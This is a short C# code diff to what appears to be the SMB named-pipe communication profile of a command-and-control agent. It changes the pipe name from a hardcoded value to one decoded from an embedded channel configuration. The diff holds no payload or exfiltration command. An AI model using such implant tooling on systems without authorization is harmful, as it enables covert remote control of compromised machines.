@@ -20,7 +20,7 @@ namespace Agent.Profiles
         private ICryptoManager crypt { get; set; }
         private IMessageManager messageManager { get; set; }
         private ILogger logger { get; set; }
-        private string pipeName = "pipe_name";
+        private string pipeName;
         private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
         private PipeServer<SmbMessage> serverPipe { get; set; }
         private ManualResetEventSlim checkinAvailable = new ManualResetEventSlim(false);
@@ -40,6 +40,11 @@ namespace Agent.Profiles
             this.crypt = crypto;
             this.logger = logger;
             this.messageManager = messageManager;
+            var opts = JsonSerializer.Deserialize(
+                ChannelConfig.Decode(),
+                SmbChannelOptionsJsonContext.Default.SmbChannelOptions)
+                ?? throw new InvalidOperationException("Invalid SMB profile configuration");
+            this.pipeName = opts.PipeName;
 
             this.serverPipe = new PipeServer<SmbMessage>(this.pipeName);
             if (OperatingSystem.IsWindows())
